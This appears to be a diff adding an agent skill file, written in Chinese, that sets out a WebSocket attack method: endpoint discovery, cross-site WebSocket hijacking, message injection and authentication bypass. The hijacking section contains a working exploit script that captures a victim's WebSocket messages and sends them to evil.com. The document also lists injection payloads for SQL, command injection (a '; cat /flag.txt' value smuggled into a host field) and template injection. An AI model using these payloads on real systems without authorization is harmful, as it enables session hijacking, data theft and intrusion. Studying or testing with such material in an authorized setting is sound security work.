@@ -1,0 +1,108 @@
+---
+name: websocket-attack
+description: "WebSocket 安全测试。当目标使用 ws:// 或 wss:// 协议、页面 JS 中有 new WebSocket() 调用、或发现 101 Switching Protocols 响应时使用。覆盖 WS 劫持(CSWSH)、消息注入、认证绕过、信息泄露"
+metadata:
+  tags: "websocket,ws,wss,cswsh,hijack,real-time,socket,upgrade"
+  category: "exploit"
+---
+
+# WebSocket 安全测试方法论
+
+
+WebSocket 提供全双工通信，但安全机制常被忽略——没有同源策略的自动保护、没有 CSRF token 的标准实践。
+
+## Phase 1: 发现 WebSocket 端点
+
+### 1.1 页面分析
+在 JS 源码中搜索：
+- `new WebSocket(`
+- `ws://` 或 `wss://`
+- `socket.io`（Socket.IO 库）
+- `.onmessage`, `.send(`
+
+### 1.2 网络层识别
+- HTTP 101 响应 + `Upgrade: websocket` 头
+- 常见路径：`/ws`, `/websocket`, `/socket.io/`, `/cable`（ActionCable）
+
+## Phase 2: Cross-Site WebSocket Hijacking (CSWSH)
+
+WebSocket 握手是 HTTP Upgrade 请求，浏览器会自动携带 Cookie。如果服务端不检查 Origin 头→可跨站劫持。
+
+### 2.1 检测
+```
+http_request url="http://target/ws" method="GET" headers={"Upgrade":"websocket","Connection":"Upgrade","Sec-WebSocket-Version":"13","Sec-WebSocket-Key":"dGhlIHNhbXBsZSBub25jZQ==","Origin":"https://evil.com"}
+```
+如果返回 101 → Origin 未校验 → 可劫持。
+
+### 2.2 利用
+```html
+<script>
+var ws = new WebSocket("wss://target.com/ws");
+ws.onopen = function() {
+    ws.send('{"action":"getProfile"}');
+};
+ws.onmessage = function(e) {
+    // 窃取数据
+    fetch("http://evil.com/log?d=" + encodeURIComponent(e.data));
+};
+</script>
+```
+
+## Phase 3: 消息注入
+
+### 3.1 常见注入点
+WebSocket 消息通常是 JSON，测试注入：
+
+**SQL 注入**：
+```json
+{"action":"search","query":"' OR 1=1--"}
+```
+
+**命令注入**：
+```json
+{"action":"ping","host":"127.0.0.1; cat /flag.txt"}
+```
+
+**SSTI**：
+```json
+{"action":"render","template":"{{7*7}}"}
+```
+
+### 3.2 认证绕过
+某些 WS 实现在握手时认证，但消息级别不检查权限：
+- 连接后发送管理员操作消息
+- 修改消息中的 user_id/role 字段
+- 发送未公开的 action 类型（从 JS 源码中发现）
+
+## Phase 4: 信息泄露
+
+WebSocket 常用于实时功能，可能泄露：
+- 其他用户的聊天消息
+- 系统通知（含内部信息）
+- 实时日志/调试信息
+- 管理操作的广播
+
+监听所有消息，不急于发送——有时被动监听就能获取敏感数据。
+
+## Phase 5: Socket.IO 特殊处理
+
+Socket.IO 使用自己的协议格式：
+- 消息格式：`42["event_name",{data}]`（4=message, 2=event）
+- 先用 HTTP 轮询再升级 WS：`/socket.io/?EIO=4&transport=polling`
+- 命名空间：可以连接 `/admin` 命名空间试图访问管理功能
+
+### 5.1 Socket.IO 枚举
+- 事件名枚举：搜索 JS 源码查找隐藏事件名
+
+### 5.2 认证缺口
+- 握手时有认证但消息级别不检查权限（认证不一致/权限缺口）
+
+## 深入参考
+
+- WebSocket 高级利用技术（CSWSH 深入/SockJS/走私/认证提取） → [references/websocket-exploitation.md](references/websocket-exploitation.md)
+
+## Phase 6: 注意事项
+
+- WebSocket 不受浏览器同源策略保护（只靠服务端 Origin 检查）
+- 消息内容通常无自动编码/转义，注入风险高
+- 长连接意味着可以持续监听和注入
